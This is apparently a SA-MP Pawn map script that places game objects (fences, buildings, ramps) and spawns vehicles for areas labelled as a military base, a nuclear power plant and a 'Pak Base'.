CreateDynamicObject(987, 164.55151, 2090.91309, 18.30402,   0.00000, 0.00000, 181.99951);
CreateDynamicObject(3279, 351.50000, 1809.90002, 17.50000,   0.00000, 0.00000, 196.00000);
CreateDynamicObject(16095, 336.00000, 1796.69995, 17.00000,   0.00000, 0.00000, 299.49463);
CreateDynamicObject(16096, 101.60000, 2081.89990, 18.70000,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(10675, 176.70000, 1997.09998, 20.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10675, 160.80000, 1997.50000, 21.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10675, 160.59961, 2019.89941, 20.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10675, 176.39999, 2019.69995, 20.30000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10244, 368.60001, 1890.40002, 22.00000,   0.00000, 0.00000, 3.98901);
CreateDynamicObject(10244, 361.39999, 1889.69995, 19.00000,   0.00000, 0.00000, 3.98804);
CreateDynamicObject(1682, 373.59961, 1901.59961, 62.60000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(980, 97.30000, 2061.39990, 19.20000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(978, 90.10000, 2064.80005, 17.30000,   0.00000, 0.00000, 2.00000);
CreateDynamicObject(978, 81.60000, 2064.50000, 17.30000,   0.00000, 0.00000, 1.99951);
CreateDynamicObject(978, 88.70000, 2078.10010, 17.40000,   0.00000, 0.00000, 183.99951);
CreateDynamicObject(978, 80.70000, 2077.50000, 17.30000,   0.00000, 0.00000, 183.99902);
CreateDynamicObject(3268, 115.70000, 2027.40002, 17.60000,   0.00000, 0.00000, 179.99451);
CreateDynamicObject(1634, 844.20001, -1812.69995, 12.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1634, 840.20001, -1812.69995, 12.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1634, 836.09998, -1812.69995, 12.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1634, 831.90002, -1812.69995, 12.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1634, 827.90002, -1812.69995, 12.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1634, 823.70001, -1812.19995, 12.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1634, 819.59998, -1812.09998, 12.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1634, 819.29999, -1806.40002, 15.00000,   0.00000, 0.00000, 2.00000);
CreateDynamicObject(1634, 823.40002, -1806.19995, 15.00000,   0.00000, 0.00000, 2.00000);
CreateDynamicObject(1634, 827.70001, -1806.19995, 15.00000,   0.00000, 0.00000, 1.99951);
CreateDynamicObject(1634, 831.90002, -1806.30005, 15.00000,   0.00000, 0.00000, 1.99951);
CreateDynamicObject(1634, 836.00000, -1805.90002, 15.00000,   0.00000, 0.00000, 1.99951);
CreateDynamicObject(1634, 840.20001, -1805.80005, 15.00000,   0.00000, 0.00000, 1.99951);
CreateDynamicObject(1634, 844.09998, -1805.40002, 15.00000,   0.00000, 0.00000, 1.99951);
CreateDynamicObject(16430, 835.79999, -2064.30005, 10.40000,   1.00000, 30.00000, 90.99695);
CreateDynamicObject(16430, 839.00000, -2178.10010, 75.90000,   0.99976, 29.99817, 90.99426);
CreateDynamicObject(16430, 842.29999, -2297.39990, 144.89999,   0.99976, 29.99817, 90.99426);
CreateDynamicObject(16430, 845.29999, -2405.89990, 207.70000,   0.99976, 29.99817, 90.99426);
CreateDynamicObject(16430, 848.79999, -2532.80005, 281.00000,   0.99976, 29.99817, 90.99426);
CreateDynamicObject(16430, 852.00000, -2655.00000, 351.89999,   0.99976, 29.99817, 90.99426);
CreateDynamicObject(8040, 853.09998, -2763.80005, 392.79999,   0.00000, 0.00000, 92.00000);
CreateDynamicObject(974, 855.40002, -1820.80005, 14.00000,   0.00000, 0.00000, 268.00000);
CreateDynamicObject(974, 855.20001, -1827.00000, 14.00000,   0.00000, 0.00000, 267.99500);
CreateDynamicObject(974, 854.79999, -1832.80005, 13.20000,   0.00000, 0.00000, 267.99500);
CreateDynamicObject(974, 811.90002, -1810.50000, 14.80000,   0.00000, 0.00000, 267.99500);
CreateDynamicObject(974, 811.70001, -1816.59998, 14.80000,   0.00000, 0.00000, 267.99500);
CreateDynamicObject(974, 811.50000, -1821.00000, 14.80000,   0.00000, 0.00000, 267.99500);
CreateDynamicObject(974, 854.29999, -1838.40002, 12.30000,   0.00000, 0.00000, 267.99500);
CreateDynamicObject(974, 853.79999, -1844.09998, 11.40000,   0.00000, 0.00000, 267.99500);
CreateDynamicObject(974, 814.50000, -1824.40002, 15.10000,   0.00000, 0.00000, 359.99500);
CreateDynamicObject(974, 815.79999, -1824.40002, 15.10000,   0.00000, 0.00000, 359.99451);
CreateDynamicObject(974, 818.59998, -1827.50000, 12.20000,   0.00000, 0.00000, 273.99451);
CreateDynamicObject(974, 819.59998, -1839.69995, 14.40000,   0.00000, 0.00000, 273.99353);
CreateDynamicObject(974, 819.09961, -1833.69922, 14.30000,   0.00000, 0.00000, 273.99353);
CreateDynamicObject(974, 818.59998, -1827.19995, 14.20000,   0.00000, 0.00000, 273.99353);
CreateDynamicObject(2669, 850.00000, -1818.19995, 12.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2669, 850.00000, -1823.69995, 12.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(974, 185.10001, 2031.90002, 19.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(974, 178.60001, 2031.90002, 19.70000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(974, 172.00000, 2031.90002, 19.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(974, 165.60001, 2031.90002, 20.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(974, 159.10001, 2031.90002, 20.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(974, 152.50000, 2032.00000, 20.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(974, 183.60001, 1983.69995, 19.70000,   0.00000, 0.00000, 2.00000);
CreateDynamicObject(974, 177.80000, 1983.40002, 19.90000,   0.00000, 0.00000, 2.00000);
CreateDynamicObject(974, 171.39999, 1983.00000, 20.20000,   0.00000, 0.00000, 2.00000);
CreateDynamicObject(974, 164.89999, 1982.69995, 20.50000,   0.00000, 0.00000, 2.00000);
CreateDynamicObject(974, 149.00000, 2028.80005, 20.40000,   0.00000, 0.00000, 89.99951);
CreateDynamicObject(974, 149.00000, 2022.09998, 20.60000,   0.00000, 0.00000, 89.99451);
CreateDynamicObject(974, 149.00000, 2015.40002, 20.80000,   0.00000, 0.00000, 89.99451);
CreateDynamicObject(974, 149.00000, 2008.80005, 20.90000,   0.00000, 0.00000, 89.99451);
CreateDynamicObject(974, 149.00000, 2002.09998, 21.00000,   0.00000, 0.00000, 89.99451);
CreateDynamicObject(974, 148.89999, 1989.30005, 21.20000,   0.00000, 0.00000, 89.99451);
CreateDynamicObject(974, 148.89999, 1986.09998, 21.20000,   0.00000, 0.00000, 89.99451);
CreateDynamicObject(974, 158.39999, 1982.59998, 20.80000,   0.00000, 0.00000, 357.99451);
CreateDynamicObject(974, 152.20000, 1982.69995, 21.00000,   0.00000, 0.00000, 359.99402);
CreateDynamicObject(974, 149.00000, 1995.59998, 21.10000,   0.00000, 0.00000, 89.99451);
CreateDynamicObject(9241, 165.20000, 1963.50000, 18.50000,   0.00000, 0.00000, 237.99451);
CreateDynamicObject(8335, 336.29999, 1835.00000, 20.60000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(7981, 208.39999, 1949.40002, 21.60000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1682, 213.00000, 1951.40002, 33.10000,   0.00000, 0.00000, 2.00000);
CreateDynamicObject(974, 185.20000, 1983.80005, 19.60000,   0.00000, 0.00000, 1.99951);
CreateDynamicObject(8210, 124.95662, 2090.85913, 17.58895,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 170.50996, 2091.15918, 20.24295,   0.00000, 0.00000, 182.17950);
CreateDynamicObject(8209, 226.13757, 1799.20801, 19.61581,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8209, 147.84839, 1799.09460, 19.61581,   0.00000, 0.00000, 0.18000);
CreateDynamicObject(8150, 96.62898, 1876.37402, 20.40000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3749, 97.92432, 1807.43262, 22.46714,   0.00000, 0.00000, -90.05999);
CreateDynamicObject(8171, 301.80191, 1991.15698, 16.68907,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8172, 304.87164, 1904.45142, 16.59213,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8172, 301.85962, 1862.11829, 16.71626,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(4832, 205.88905, 1864.76685, 56.69511,   0.00000, 0.00000, 0.00000);
//Vehicles//
AddStaticVehicleEx(520,203.6000061,2016.0999756,18.6000004,270.0000000,-1,-1,15); //Hydra
AddStaticVehicleEx(520,204.1999969,1979.9000244,18.6000004,270.0000000,-1,-1,15); //Hydra
AddStaticVehicleEx(520,282.0000000,2023.5000000,18.6000004,270.0000000,-1,-1,15); //Hydra
AddStaticVehicleEx(476,281.1000061,1989.0999756,18.7999992,270.0000000,111,130,15); //Rustler
AddStaticVehicleEx(476,283.0000000,1954.8994141,18.8299999,270.0000000,111,130,15); //Rustler
AddStaticVehicleEx(425,337.2000122,1866.8000488,21.6000004,90.0000000,95,10,15); //Hunter
AddStaticVehicleEx(563,338.7000122,1999.5999756,21.3999996,0.0000000,245,245,15); //Raindance
AddStaticVehicleEx(432,115.5000000,2046.1999512,18.2000008,268.0000000,95,10,15); //Rhino
AddStaticVehicleEx(433,120.5999985,1986.1999512,19.8999996,0.0000000,95,10,15); //Barracks
AddStaticVehicleEx(433,115.5999985,1985.9000244,19.7000008,0.0000000,95,10,15); //Barracks
AddStaticVehicleEx(433,111.0000000,1985.9000244,19.5000000,0.0000000,95,10,15); //Barracks
AddStaticVehicleEx(470,123.0000000,1950.9000244,19.5000000,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,119.3000031,1950.5999756,19.2999992,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,115.4000015,1950.1999512,19.2000008,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,111.9000015,1950.1999512,19.0000000,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(433,357.0000000,1898.5000000,18.2000008,267.9954834,95,10,15); //Barracks
AddStaticVehicleEx(433,357.0000000,1902.3000488,18.2000008,267.9954834,95,10,15); //Barracks
AddStaticVehicleEx(433,357.0000000,1906.3000488,18.2000008,267.9954834,95,10,15); //Barracks
AddStaticVehicleEx(598,356.8999939,1915.6999512,17.5000000,270.0000000,-1,-1,15); //Police Car (LVPD)
AddStaticVehicleEx(598,356.8999939,1911.8000488,17.5000000,270.0000000,-1,-1,15); //Police Car (LVPD)
AddStaticVehicleEx(598,356.8999939,1919.3000488,17.5000000,270.0000000,-1,-1,15); //Police Car (LVPD)
AddStaticVehicleEx(522,358.7000122,1958.0000000,17.2999992,263.9959717,132,4,15); //NRG-500
AddStaticVehicleEx(522,358.7000122,1962.1999512,17.2999992,263.9959717,132,4,15); //NRG-500
AddStaticVehicleEx(522,358.7000122,1960.6999512,17.2999992,263.9959717,132,4,15); //NRG-500
AddStaticVehicleEx(476,302.5000000,2065.0000000,18.7999992,180.0000000,111,130,15); //Rustler
AddStaticVehicleEx(476,315.8999939,2065.1000977,18.7999992,180.0000000,111,130,15); //Rustler
AddStaticVehicleEx(497,374.2999878,1958.5999756,27.0000000,270.0000000,-1,-1,15); //Police Maverick
AddStaticVehicleEx(497,374.1000061,1928.4000244,27.0000000,270.0000000,-1,-1,15); //Police Maverick
AddStaticVehicleEx(543,221.1000061,1920.1999512,17.6000004,0.0000000,30,46,15); //Sadler
AddStaticVehicleEx(543,218.1999969,1920.0999756,17.6000004,0.0000000,30,46,15); //Sadler
AddStaticVehicleEx(470,214.8000031,1920.0999756,17.7999992,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,211.0000000,1920.1999512,17.7999992,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,207.3999939,1920.0999756,17.7999992,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(596,203.3999939,1920.4000244,17.5000000,0.0000000,-1,-1,15); //Police Car (LSPD)
AddStaticVehicleEx(597,200.5000000,1920.4000244,17.5000000,0.0000000,-1,-1,15); //Police Car (SFPD)
AddStaticVehicleEx(598,197.6000061,1920.3000488,17.5000000,0.0000000,-1,-1,15); //Police Car (LVPD)
AddStaticVehicleEx(599,194.0000000,1919.9000244,18.0000000,0.0000000,-1,-1,15); //Police Ranger
AddStaticVehicleEx(599,190.5000000,1920.0000000,18.0000000,0.0000000,-1,-1,15); //Police Ranger
AddStaticVehicleEx(490,186.8000031,1934.6999512,18.0000000,0.0000000,-1,-1,15); //FBI Rancher
AddStaticVehicleEx(490,183.3999939,1934.5000000,18.2000008,0.0000000,-1,-1,15); //FBI Rancher
AddStaticVehicleEx(433,176.1999969,1933.9000244,18.7000008,0.0000000,95,10,15); //Barracks
AddStaticVehicleEx(433,171.3000031,1934.0000000,18.8999996,0.0000000,95,10,15); //Barracks
AddStaticVehicleEx(468,358.8999939,1965.0000000,17.3999996,270.0000000,215,142,15); //Sanchez
AddStaticVehicleEx(468,358.7999878,1959.4000244,17.3999996,270.0000000,215,142,15); //Sanchez
AddStaticVehicleEx(471,360.8999939,1926.5000000,17.2000008,270.0000000,96,26,15); //Quad
AddStaticVehicleEx(471,361.0000000,1927.9000244,17.2000008,270.0000000,96,26,15); //Quad
AddStaticVehicleEx(528,114.5000000,2016.4000244,19.0000000,0.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(528,110.3000031,2016.3000488,18.8999996,0.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(528,118.1999969,2016.3000488,19.2000008,0.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(427,122.3000031,2018.1999512,19.2000008,0.0000000,-1,-1,15); //Enforcer
AddStaticVehicleEx(471,106.5000000,2079.8999023,17.2000008,0.0000000,19,69,15); //Quad
AddStaticVehicleEx(471,108.0000000,2079.8999023,17.2000008,0.0000000,19,69,15); //Quad
AddStaticVehicleEx(470,100.5000000,1913.1999512,18.3999996,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,104.0999985,1913.0999756,18.5000000,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,203.5000000,1813.0999756,17.7999992,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,200.5000000,1813.0999756,17.7999992,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,383.1000061,2069.0000000,17.7999992,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(470,386.2000122,2068.8999023,17.7999992,0.0000000,95,10,15); //Patriot
AddStaticVehicleEx(528,214.5000000,1856.1999512,13.1999998,0.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(528,217.6000061,1856.0999756,13.1999998,0.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(528,220.8000031,1855.6999512,13.1999998,0.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(432,351.2000122,1835.5000000,18.1000004,0.0000000,95,10,15); //Rhino
AddStaticVehicleEx(544,120.3000031,2083.8999023,18.0000000,0.0000000,132,4,15); //Firetruck LA
AddStaticVehicleEx(544,123.8000031,2083.6999512,18.0000000,0.0000000,132,4,15); //Firetruck LA
AddStaticVehicleEx(548,363.8999939,1997.5000000,22.3999996,0.0000000,245,245,15); //Cargobob
AddStaticVehicleEx(417,373.2000122,1943.0999756,25.7000008,272.0000000,-1,-1,15); //Leviathan
AddStaticVehicleEx(463,358.8999939,1963.5999756,17.2999992,270.0000000,76,117,15); //Freeway
AddStaticVehicleEx(523,358.8999939,1971.5000000,17.2999992,272.0000000,-1,-1,15); //HPV1000
AddStaticVehicleEx(523,358.7999878,1970.0000000,17.2999992,271.9995117,-1,-1,15); //HPV1000
AddStaticVehicleEx(523,99.1999969,1938.5999756,17.8999996,0.0000000,-1,-1,15); //HPV1000
AddStaticVehicleEx(523,100.6999969,1938.5000000,18.0000000,0.0000000,-1,-1,15); //HPV1000
AddStaticVehicleEx(581,101.9000015,1938.5000000,18.1000004,0.0000000,31,37,15); //BF-400
AddStaticVehicleEx(522,103.0999985,1938.6999512,18.1000004,0.0000000,189,190,15); //NRG-500
AddStaticVehicleEx(521,104.3000031,1938.8000488,18.1000004,0.0000000,109,108,15); //FCR-900
AddStaticVehicleEx(471,105.8000031,1939.0000000,18.1000004,0.0000000,96,26,15); //Quad
AddStaticVehicleEx(469,164.8000031,1962.9000244,20.3999996,0.0000000,245,245,15); //Sparrow
AddStaticVehicleEx(487,227.3999939,1893.8000488,17.8999996,0.0000000,93,126,15); //Maverick
AddStaticVehicleEx(402,198.1999969,1877.5000000,17.6000004,0.0000000,88,89,15); //Buffalo
AddStaticVehicleEx(411,200.8999939,1877.3000488,17.3999996,0.0000000,16,80,15); //Infernus
//Nuclear Power Plant
CreateDynamicObject(17001, 1021.42499, 2674.98975, 9.55139,   0.00000, 0.00000, -150.06000);
CreateDynamicObject(6295, 978.88770, 2645.18384, 33.98090,   -177.11980, -178.56010, -115.02000);
CreateDynamicObject(1682, 980.31793, 2682.86304, 15.28325,   0.00000, 0.00000, 99.05999);
CreateDynamicObject(18850, 1014.11273, 2691.65796, 9.76315,   0.00000, 0.00000, 28.56000);
CreateDynamicObject(3749, 957.34198, 2658.19141, 15.15446,   -3.24001, 0.83999, -60.41998);
CreateDynamicObject(987, 961.72656, 2648.89819, 9.71322,   0.00000, 0.00000, -58.02000);
CreateDynamicObject(987, 968.17346, 2638.66528, 9.37459,   0.00000, 0.00000, -60.30000);
CreateDynamicObject(987, 974.09308, 2628.42529, 9.80737,   0.00000, 0.00000, 27.78000);
CreateDynamicObject(987, 984.76654, 2634.15259, 9.80029,   0.00000, 0.00000, 28.20001);
CreateDynamicObject(987, 995.13483, 2639.55713, 9.81372,   0.00000, 0.00000, 29.46000);
CreateDynamicObject(987, 1005.54724, 2645.50171, 9.79885,   0.00000, 0.00000, 28.20000);
CreateDynamicObject(987, 1016.09875, 2651.35352, 9.80840,   0.00000, 0.00000, 27.96000);
CreateDynamicObject(987, 1026.53210, 2657.08643, 9.80484,   0.00000, 0.00000, 27.42001);
CreateDynamicObject(17001, 1003.23627, 2706.52075, 9.55322,   0.00000, 0.00000, 30.00000);
CreateDynamicObject(1682, 1026.21912, 2709.14746, 16.50927,   0.00000, 0.00000, 147.48000);
CreateDynamicObject(987, 1037.16614, 2662.67188, 9.72487,   0.00000, 0.00000, 28.50000);
CreateDynamicObject(987, 1047.74829, 2668.31104, 9.80650,   0.00000, 0.00000, 30.96001);
CreateDynamicObject(987, 1057.30212, 2674.02075, 9.80868,   0.00000, 0.00000, 32.46001);
CreateDynamicObject(13657, 2369.18091, -6919.85547, -2228.90674,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 946.55688, 2676.74341, 9.69918,   0.00000, 0.00000, -59.87999);
CreateDynamicObject(987, 940.15161, 2686.99658, 10.07932,   0.00000, 0.00000, 301.32010);
CreateDynamicObject(987, 933.98456, 2697.22729, 10.04115,   0.00000, 0.00000, -59.03999);
CreateDynamicObject(987, 943.71637, 2703.67285, 10.04778,   0.00000, 0.00000, -146.28003);
CreateDynamicObject(987, 953.81714, 2710.14722, 9.96441,   0.00000, 0.00000, -147.06012);
CreateDynamicObject(987, 963.91980, 2716.77588, 10.00550,   0.00000, 0.00000, -147.17993);
CreateDynamicObject(987, 973.97711, 2723.05518, 9.96546,   0.00000, 0.00000, -147.60001);
CreateDynamicObject(987, 983.42969, 2729.77686, 10.02247,   0.00000, 0.00000, -144.89996);
CreateDynamicObject(987, 993.23407, 2737.13696, 11.19796,   1.32000, -0.42000, -143.34004);
CreateDynamicObject(987, 1002.96698, 2743.72559, 12.95424,   1.32000, 0.24000, -145.31995);
CreateDynamicObject(987, 1014.76141, 2742.16309, 13.28409,   0.00000, 0.00000, -187.91995);
CreateDynamicObject(8168, 955.75647, 2648.23730, 11.56853,   0.00000, 0.00000, -136.98009);
CreateDynamicObject(8168, 947.33429, 2662.24487, 11.67924,   0.00000, 0.00000, 46.43999);
CreateDynamicObject(17050, 944.87354, 2690.13013, 9.60034,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(17050, 949.04230, 2683.91064, 9.75573,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(17050, 953.41772, 2678.37866, 9.76742,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(17015, 967.47638, 2711.36035, 43.03728,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(17015, 1004.40277, 2733.84692, 44.75512,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18749, 984.85675, 2564.36328, 25.50733,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1025.71741, 2737.44409, 12.78616,   0.00000, 0.00000, -203.09998);
CreateDynamicObject(987, 1036.70129, 2732.78638, 12.56106,   0.00000, 0.00000, -203.09998);
CreateDynamicObject(987, 1044.35632, 2723.68481, 10.54188,   0.00000, 0.00000, -229.67996);
CreateDynamicObject(987, 1052.70801, 2715.26563, 10.48146,   0.00000, 0.00000, -225.00006);
CreateDynamicObject(987, 1067.27466, 2680.32861, 9.85726,   0.00000, 0.00000, -251.03992);
CreateDynamicObject(987, 1059.68860, 2702.88696, 11.71978,   0.00000, 0.00000, -245.03986);
CreateDynamicObject(987, 1063.36267, 2691.54858, 10.90825,   0.00000, 0.00000, -252.11989);
CreateDynamicObject(987, 1054.84436, 2713.13672, 10.48146,   0.00000, 0.00000, -225.00006);
//Pak Base
CreateDynamicObject(987, -705.72192, 990.31635, 11.00638,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -693.79211, 990.31158, 11.00638,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -681.87665, 990.34509, 11.00638,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -669.96124, 990.56714, 11.10638,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -658.04028, 990.44324, 11.10538,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -646.06116, 990.59094, 10.20438,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -634.43817, 990.37231, 9.19938,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -622.82220, 990.39825, 8.49838,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -611.14368, 990.39111, 8.49838,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -738.95471, 978.25110, 11.30640,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(9482, -719.80780, 990.20056, 17.70850,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, -738.90448, 966.28119, 11.30640,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, -738.81085, 954.27667, 10.60540,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, -738.88208, 942.25934, 10.60440,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, -738.77747, 942.18750, 10.62523,   0.00000, 0.00000, 263.67346);
CreateDynamicObject(987, -739.54877, 989.96533, 11.00638,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -739.42950, 931.32648, 10.73417,   0.00000, 0.00000, 208.19351);
CreateDynamicObject(987, -746.88367, 927.02844, 9.95024,   0.00000, 0.00000, 214.48956);
CreateDynamicObject(987, -705.82538, 774.28754, 16.81770,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16139, -692.18439, 775.19214, -5.34921,   0.00000, 49.50000, 343.73129);
CreateDynamicObject(16139, -686.46802, 776.72534, -5.34921,   0.00000, 49.50000, 343.73129);
CreateDynamicObject(16139, -692.18439, 775.19214, -5.34921,   0.00000, 49.50000, 343.73129);
CreateDynamicObject(16139, -585.88330, 996.01971, -12.39801,   0.00000, 49.50000, 344.35657);
CreateDynamicObject(18768, -698.24384, 829.39215, 42.38535,   0.00000, 0.00000, 352.72809);
CreateDynamicObject(18850, -698.42200, 829.39038, 31.05299,   0.00000, 0.00000, 352.94931);
CreateDynamicObject(16568, -689.27106, 967.81860, 13.39890,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(16562, -662.39825, 976.21124, 13.39890,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3928, -659.71753, 974.96497, 18.03823,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3928, -688.58209, 970.32349, 18.03320,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(4005, -695.91071, 827.35846, 18.37269,   0.00000, 0.00000, 350.71533);
CreateDynamicObject(700, -706.07159, 981.80029, 11.55469,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(700, -647.09821, 993.07263, 11.65469,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(700, -707.08514, 965.70715, 11.55469,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(700, -687.86523, 992.88507, 11.55469,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(700, -675.02612, 993.09326, 11.55469,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(700, -663.37109, 993.30298, 11.55469,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(987, -717.75940, 774.26385, 16.81770,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -770.59039, 774.36517, 15.81470,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -780.39868, 778.30615, 16.01068,   0.00000, 0.00000, 338.45096);
CreateDynamicObject(987, -784.17889, 788.29541, 15.72846,   0.00000, 0.00000, 291.80789);
CreateDynamicObject(987, -784.78357, 800.17035, 14.91535,   0.00000, 0.00000, 273.08969);
CreateDynamicObject(987, -778.35565, 911.43457, 9.95024,   0.00000, 0.00000, 209.44987);
CreateDynamicObject(987, -767.57990, 915.95148, 9.95024,   0.00000, 0.00000, 202.51897);
CreateDynamicObject(987, -756.57513, 920.44800, 9.95024,   0.00000, 0.00000, 202.51897);
CreateDynamicObject(14395, -702.15350, 842.67230, 32.55042,   0.00000, 0.00000, 83.17416);
CreateDynamicObject(14395, -701.69647, 848.66553, 36.59273,   0.00000, 0.00000, 353.09103);
CreateDynamicObject(3571, -710.11603, 836.91187, 13.10585,   0.00000, 0.00000, 79.75486);
CreateDynamicObject(14395, -695.42407, 848.16571, 40.89079,   0.00000, 0.00000, 263.28360);
CreateDynamicObject(3279, -694.69788, 855.98431, 11.55997,   0.00000, 0.00000, 351.17776);
CreateDynamicObject(3279, -760.97607, 912.05115, 10.88279,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(13011, -694.94165, 855.04767, 28.18517,   0.00000, 0.00000, 168.55153);
CreateDynamicObject(8556, -740.24518, 779.59784, 21.19300,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -727.60468, 774.31622, 16.81770,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -764.03870, 774.47290, 15.81470,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3425, -783.82880, 900.84387, 21.74402,   0.00000, 0.00000, 86.64863);
CreateDynamicObject(7347, -619.69525, 941.31262, -30.45286,   0.00000, 0.00000, 268.46713);
CreateDynamicObject(3414, -741.28326, 910.89978, 13.41577,   0.00000, 0.00000, 144.28014);
CreateDynamicObject(3881, -727.10645, 986.60907, 13.22390,   0.00000, 0.00000, 178.69324);
CreateDynamicObject(640, 1335.82813, 1264.30469, 10.73438,   3.14159, 0.00000, 1.57080);
CreateDynamicObject(640, 1302.22656, 1264.30469, 10.73438,   3.14159, 0.00000, 1.57080);
CreateDynamicObject(640, 1311.78906, 1250.74219, 10.49219,   3.14159, 0.00000, 1.57080);
CreateDynamicObject(640, 1326.30469, 1250.74219, 10.49219,   3.14159, 0.00000, 1.57080);
CreateDynamicObject(628, 1330.10938, 1262.75781, 15.10156,   3.14159, 0.00000, 1.96654);
CreateDynamicObject(628, 1308.07031, 1262.75781, 15.10156,   3.14159, 0.00000, 2.94230);
CreateDynamicObject(8034, -770.46619, 860.78601, 15.36118,   0.00000, 0.00000, 272.61166);
CreateDynamicObject(987, -785.04352, 811.83472, 14.00632,   0.00000, 0.00000, 273.08969);
CreateDynamicObject(987, -785.42773, 823.56165, 12.99422,   0.00000, 0.00000, 273.08969);
CreateDynamicObject(987, -785.96777, 835.46320, 13.30336,   0.00000, 0.00000, 273.08969);
CreateDynamicObject(987, -786.53638, 847.21094, 11.99531,   0.00000, 0.00000, 273.08969);
CreateDynamicObject(987, -787.06775, 859.11694, 11.80572,   0.00000, 0.00000, 273.08969);
CreateDynamicObject(987, -787.64874, 870.88080, 11.98675,   0.00000, 0.00000, 273.08969);
CreateDynamicObject(987, -788.02460, 882.64551, 10.97871,   0.00000, 0.00000, 273.08969);
CreateDynamicObject(987, -788.45380, 894.43671, 10.69698,   0.00000, 0.00000, 273.08969);
CreateDynamicObject(987, -788.95050, 905.80481, 10.67743,   0.00000, 0.00000, 272.60059);
CreateDynamicObject(3884, -1324.32813, 493.81250, 21.05469,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10831, -770.15662, 809.14502, 17.22403,   0.00000, 0.00000, 91.18965);
CreateDynamicObject(16327, -707.17590, 988.79089, 5.99409,   0.00000, 0.00000, 273.27594);
CreateDynamicObject(8550, -776.20734, 860.16614, 22.99376,   0.00000, 0.00000, 1.51607);
CreateDynamicObject(1596, -752.74829, 845.89893, 20.33401,   0.00000, 0.00000, 93.55882);
CreateDynamicObject(1596, -754.45300, 876.46741, 20.45430,   0.00000, 0.00000, 93.55882);
